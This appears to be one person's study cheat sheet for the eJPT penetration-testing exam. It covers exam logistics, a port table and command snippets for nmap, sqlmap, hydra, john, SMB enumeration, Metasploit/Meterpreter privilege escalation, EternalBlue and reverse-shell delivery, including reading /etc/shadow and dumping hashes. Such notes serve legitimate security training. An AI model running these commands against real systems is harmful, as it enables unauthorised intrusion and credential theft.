Skidrow/Yasir Twitter @firfox20  RedTeamer | Pentester | BugBouny Hunter


==============================================
- > Exam Time [48H]
- >  Exam Type [Multiple Choice]
- >  Lab Type [ Webbased Linux Distro no Openvpn file]
- >  You Can't Pause the exam [you got 48hMax if you got something to do keep network &BrowserRuning ] 
- >  there is around 4 Dynamic flag.txt to be found & submitted
- > Exam & course cost $250 in Ine website 
* * Exam Parts  * *
==============================================
* Host & Network Auditing 



* Assessment Methodologies 



* Host & Network Pentesting 



* Web Application Pentesting 
==============================================

==============================================
** Tips ** 
Learn Basic Linux & windows Commands 
Learn Basic Shell,Malrware Creation & Deployment on Targets 
Learn Basic Recon Methdoliges on Targets [Gather Much info as you need ] 
Learn About WebAppication Senstive Files & Exploits Such as [ Wordpress , drupal , ApacheTomCat] 
LearnAbout Networking Scanning , Poviting , subnetting ,  basic Network Commands, ipconfig, ifconfig , ping , routing , .. etc
Take you time don't Panic you got 48H get to know the enviroment , Relax , Start Setp by Step 
Always Orgenize your Wrok in Text file [ such as you findings each target [ info , recon , explotions , credinitals , .. etc to be easy to answer questions once you got everything orginized
Make sure your home network has good connection to run exam & lab without any issues .
Make sure you have a good grasp of Basic CTF , Directory Fuzzing , Type of OS , Type of Version Used of all
Make sure to learn about Common ports and services to exploit them 


==============================================
-> Common ports [ exmaple] - > Google [ Port 21 Pentesting ,Exploits]
Port 	Protocol 	Hint
22 	SSH 	        Used to Communicate between Hosts
25 	SMTP 	        Used for Email Service 	
80 	HTTP 	        Used for Web [Hosting , WebApp .. etc] 
443 	HTTPS 	        Used for Web [Hosting , WebApp .. etc] 
23 	TELNET 	        Used to Communicate by CMD terminal  
21 	FTP 	        Used to Communicate by CMD terminal/App [Transfer,GetFiles]
3389 	RDP 	        Used for Remote Desktop Service between hosts 
3306 	MYSQL 	        Used for Database Communication 
137 	NETBIOS 	 Used for Smb Sharing 
138 	NETBIOS 	 Used for Smb Sharing 
139 	NETBIOS 	 Used for Smb Sharing 

[ Routing/Pivoting ] 
Use metasploit to get poviting on host [after you hack it script AutoRoute
Helping Doc [ https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html]
==============================================
[Basic Linux Cmds] 
https://www.mypdf.in/linux-commands-list-pdf/
==============================================
[Basic Windows Cmds]

https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf
==============================================
[Nmap tool ] 
[Helping Doc]  
https://nmap.org/book/nse-usage.html
https://www.tecmint.com/use-nmap-script-engine-nse-scripts-in-linux/
==============================================
locate *.nse  - to search for nmap scripts you can choose the one you need 
nmap 192.168.1.1 [ defualt scan of host]
nmap 192.168.1.1 -sV [ Service on each port detection ] 
nmap 192.168.1.1 -O [ Type of Oprating System ]
nmap 192.168.10.1 -A [ Aggresive Scan get alot of detials such as [OS, Servicess,TraceRouts,]
nmap 192.168.100.1 -sC [ run default scritps scan on host to check for vulns]
nmap 192.168.100.1 --script vuln [ run vluns scritps scan on host to check for vulns]
nmap 192.168.100.1 -p- [Scan for all ports on target tcp , udp]
nmap 192.168.100.1/24 [Scan Entire Subnet]
nmap 192.168.1.1 -sV -A -sC [Run Full Scan ] 
nmap 192.168.1.1 -sV -A -sC  > scan.txt [ rull full scan and save it to txt file ]
nmap 192.168.1.1 --script "http-*  Loads all scripts whose name starts with http
nmap 192.168.1.1 --script "ssh-*"  load all scripts with names starting with ssh

==============================================
[Web Applications]
==============================================
Banner Grabbing 
[nc -v 192.168.1.1 80]
==============================================
[SQLMap ] 
sqlmap -u ip --user=userhere --password=passwordhere -D drupal -e'select uid,name,pass,login from users' [ dump admin hashes] 
sqlmap -u ip   --data="user=admin&password=admin" -D dbname --tables
==============================================
[Listening for reverse shell,Making]

nc -nvlp 4444 -  Listen on all interface port 4444
==============================================
Make Shell [msfvenom ]
https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
==============================================
[Setup Remote server to send payload ]

python3 -m http.server  - on AttackerHost
==============================================
on Victim Host -> open url http://0.0.0.0:8000/ download your shell and run it  to get reverse shell
[BrutForce] 
hydra -L users.txt -P pass.txt -t 10 10.10.10.10 ssh -s 22
hydra -L users.txt -P pass.txt telnet://10.10.10.10
hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz smb://192.168.1.1
Wordpress [ wpscan --url http://192.168.1.1/wordpress/wp-login.php -U admin -P rockyou.txt]
==============================================
==============================================
[wordlists]
/usr/share/wfuzz/wordlist/others/common_pass.txt
/usr/share/john/password.lst
/usr/share/wordlists/rockyou.txt.gz    gzip -d /usr/share/wordlists/rockyou.txt.gz  to unzip wordlist to a .txt file 
==============================================
[Hash Cracking]
hashid hashhere - to identfiy hash type 
john -wordlist /path/to/wordlist -users=users.txt hashfile
john hasfile.txt  - default cmd 
cat /etc/shadow
cat /etc/passwd
hashdump
==============================================
[Windows Shares] 
nmblookup -A 10.10.10.10
smbclient -L //10.10.10.10 -N
enum4linux -a 10.10.10.10
smbclient //10.10.10.10/share -N
==============================================
[Remote Desktop Conenct]
xfreerdp /f /u:user /p:password /v:192.168.100.55
==============================================
[Metasploit]
msfconsole - > run metasploit
search exploitnamehere - to search for explot [ exmaple search ssh ]
use exploit name [ exmaple use multi/handler ] to use multi handler script ]
show options                      #Check options and required value
[Meterpreter]
background - to go back to msf while session runing
sessions - K to kill all sessions
sessions -i 1 to get back to sessions  [ sessions -i sesstionNumberhere]
sysinfo, ifconfig, route, getuid   - get user , system info
getsystem (privesc) [ to esculate prive and there is also Linpeas tool ]
bypassuac [ Bypass UAC  by hijacking a DLL PrivEsc]
download x /root/ [ download file from dest] 
upload x C:\\Windows [upload a file to dest] 
shell [to entere shell ]
use post/windows/gather/hashdump   [ to dump all hash of windows ]
==============================================
[CHECK UAC/Privileges] 

run post/windows/gather/win_privs

==============================================
[MS17-010 EternalBlue SMB Remote] 

exploit(windows/smb/ms17_010_psexec)> set RHOST </Target-IP\>
exploit(windows/smb/ms17_010_psexec)> set LHOST </Attacker-IP\>
exploit(windows/smb/ms17_010_psexec)> run 
==============================================

[Directory Fuzzing]

ffuf -u ip -mc 200   -w /mywordlist/list.txt
==============================================
[Command Injection ]

whoami 
ipconfig
==============================================
[Host Discover] 
fping -a -g 10.10.10.0/24
nmap -oG - 10.10.10.0/24
ipconfig /all
ifconfig
ping 10.10.10.10
netstat -ano        #Windows
netstat -tlunp      #linux           

==============================================
[Possible Exam Questions] 

Type of OS , 
Type of Version
Type of Exploit
ip addres belong to?
how many db servers ? 
how many Windows Os ,?
what is the password for user ..  ? 
==============================================
[Reverse Php Shell]

https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php

==============================================
[eJPT Study Notes]
https://ejpt-junior-pentester.popdocs.net/
https://www.youtube.com/watch?v=tKiRaPIynRY - Finding Hidden Server 
https://github.com/cocomelonc/ejpt
https://freakydodo.medium.com/hackthebox-armageddon-writeup-armageddon-htb-walkthro-29bffa86025d
https://medium.com/@mishrasunny174/pivoting-to-internal-networks-using-ssh-like-a-boss-be1cd9c5ac0f  -Pivoting to internal networks

==============================================
[TOOLS/cmd USED ]
==============================================
hydra
wpscan
mysql
xfreerdp 
nmap 
nikto
vim or nano
fuff
whatweb
dir
ls -la
cat
download
upload
whoami
ipconfig
touch
chmod 
rm -rf 
locate
grep
==============================================

Web Application Senstive files 
[Wordpress]

wp-config.php
wp-config.php.bak
wp-content/uploads
wp-json/
wp-content/plugins

=================================================
Drupal 
/sites/
sites/default/settings.php
=================================================
